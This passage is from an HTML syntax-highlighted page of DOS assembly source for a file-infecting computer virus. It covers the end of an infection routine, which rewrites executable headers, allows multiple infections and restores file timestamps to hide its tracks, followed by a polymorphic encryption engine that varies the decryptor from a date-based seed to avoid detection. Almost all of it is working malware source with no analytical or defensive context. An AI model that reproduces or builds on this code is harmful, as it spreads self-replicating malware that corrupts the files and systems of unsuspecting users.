    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;Seek beginning of file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">BufOfs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;Write new header to file</span><span class="sc0">

    </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">;Make multi-infection possible</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">           </span><span class="sc1">;Possibility=(3/64)</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">@Close</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FlTime</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">@Close</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B9h</span><span class="sc0">            </span><span class="sc1">;mov cx,</span><span class="sc0">
</span><span class="sc5">FlTime</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;modified FileTime</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0BAh</span><span class="sc0">            </span><span class="sc1">;mov dx,</span><span class="sc0">
</span><span class="sc5">FlDate</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;FileDate</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;Restore file modification date/time</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;Close file</span><span class="sc0">
    </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc5">xor_dsdi</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">031h</span><span class="sc0">
</span><span class="sc5">add_dsdi</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc0">
</span><span class="sc5">sub_dsdi</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">029h</span><span class="sc0">
</span><span class="sc5">inc_ax</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc0">
</span><span class="sc5">dec_ax</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">048h</span><span class="sc0">
</span><span class="sc5">inc_byte_ptr</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
</span><span class="sc5">inc_word_ptr</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc5">dssi</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">02744h</span><span class="sc0">
</span><span class="sc5">dsdi</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00145h</span><span class="sc0">
</span><span class="sc5">push_ds</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01Eh</span><span class="sc0">
</span><span class="sc5">push_es</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">006h</span><span class="sc0">
</span><span class="sc5">int_21</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">021CDh</span><span class="sc0">
</span><span class="sc5">push_cs_pop_ds</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01F0Eh</span><span class="sc0">
</span><span class="sc5">mov_dx_si</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0D68Bh</span><span class="sc0">
</span><span class="sc5">mov_ah_25</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">025B4h</span><span class="sc0">
</span><span class="sc5">mov_di</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0BFh</span><span class="sc0">
</span><span class="sc5">retn_</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">

</span><span class="sc5">mov_di_COfs</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">mov_di</span><span class="sc0">
</span><span class="sc5">CrypOfs</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mov_cx_CSiz</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B9h</span><span class="sc0">
</span><span class="sc5">CrypSiz</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">CrySize</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">mov_ax_CVal</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B8h</span><span class="sc0">
</span><span class="sc5">CrypVal</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dec_di_jnz</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">04Fh</span><span class="sc4">,</span><span class="sc2">04Fh</span><span class="sc4">,</span><span class="sc2">049h</span><span class="sc4">,</span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc0">
</span><span class="sc5">add_di_lop</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc2">0C7h</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc0">
</span><span class="sc5">sub_di_lop</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc2">0EFh</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc0">
</span><span class="sc5">mov_ax_3508</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">035h</span><span class="sc0">
</span><span class="sc5">mov_si_VOfs</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0BEh</span><span class="sc0">
</span><span class="sc5">VirOfs</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">@Engine</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">VirOfs</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc5">@End</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">)-</span><span class="sc5">ProgOfs</span><span class="sc0"> </span><span class="sc1">;Calculate offset of crypted area end</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CrypOfs</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">;Get random number</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CrypVal</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">;Get DOS date cx-year;dh-month;dl-day</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">          </span><span class="sc1">;Calculate seed</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;Seed in form: Y00MMMMD</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">mov_di_COfs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ProgOfs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">mov_cx_CSiz</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ProgOfs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">mov_ax_CVal</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ProgOfs</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;DY00MMMM</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@1_1</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">@1_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;MDY00MMM</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@1_2</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">@1_2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;MMDY00MM</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@1_3</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">@1_3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">
                    </span><span class="sc1">;Choose encryption method</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">xor_dsdi</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;MMMDY00M</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@2_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">add_dsdi</span><span class="sc0">
</span><span class="sc5">@2_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;MMMMDY00</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@2_2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">sub_dsdi</span><span class="sc0">
</span><span class="sc5">@2_2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                    </span><span class="sc1">;Choose key manipulation</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">inc_ax</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;MMMDY00M</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@2_3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">dec_ax</span><span class="sc0">
</span><span class="sc5">@2_3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stosb</span><span class="sc0">
                    </span><span class="sc1">;Choose looping method</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">dec_di_jnz</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ProgOfs</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;MMDY00MM</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@3_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">add_di_lop</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ProgOfs</span><span class="sc0">
</span><span class="sc5">@3_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;MDY00MMM</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@3_2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">sub_di_lop</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ProgOfs</span><span class="sc0">
</span><span class="sc5">@3_2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
                    </span><span class="sc1">;Choose increment operand size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">inc_byte_ptr</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;DY00MMMM</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@4_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">inc_word_ptr</span><span class="sc0">
</span><span class="sc5">@4_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stosb</span><span class="sc0">
                    </span><span class="sc1">;Choose increment operand</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">dssi</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;Y00MMMMD</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@4_2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">dsdi</span><span class="sc0">
</span><span class="sc5">@4_2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                    </span><span class="sc1">;Choose PSP register to save</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">push_ds</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;00MMMMDY</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@5_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">push_es</span><span class="sc0">
</span><span class="sc5">@5_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stosb</span><span class="sc0">
                    </span><span class="sc1">;Swap pre-GetIntVec code</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">mov_ax_3508</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ProgOfs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">mov_si_VOfs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Progofs</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;Y00MMMMD</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@6_1</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">@6_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">
                    </span><span class="sc1">;Swap miscellaneous code</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">int_21</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">push_cs_pop_ds</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Swap</span><span class="sc0">            </span><span class="sc1">;DY00MMMM</span><span class="sc0">
                    </span><span class="sc1">;Swap pre-SetIntVec code</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">mov_dx_si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">mov_ah_25</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Swap</span><span class="sc0">            </span><span class="sc1">;MDY00MMM</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">BufOfs</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">VirSize</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">;Copy virus to buffer</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0FFFEh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">mov_di</span><span class="sc0">
</span><span class="sc5">@Next</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@Next</span><span class="sc0">           </span><span class="sc1">;"mov di" command found</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],(</span><span class="sc5">BufOfs</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">)+((</span><span class="sc5">@End</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">)-</span><span class="sc5">ProgOfs</span><span class="sc4">)</span><span class="sc0">
                    </span><span class="sc1">;Swap "sub|add" in encryptor</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">@CrNxt</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">sub_dsdi</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)+</span><span class="sc5">add_dsdi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@NoAdd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@NoSub</span><span class="sc0">
</span><span class="sc5">@NoAdd</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@NoSub</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">@NoSub</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">@CrRet</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc4">],</span><span class="sc5">retn_</span><span class="sc0">
    </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Swap</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@s_1</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">@s_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc5">@End</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">@Begin</span><span class="sc0">
</span></div></body>
</html>
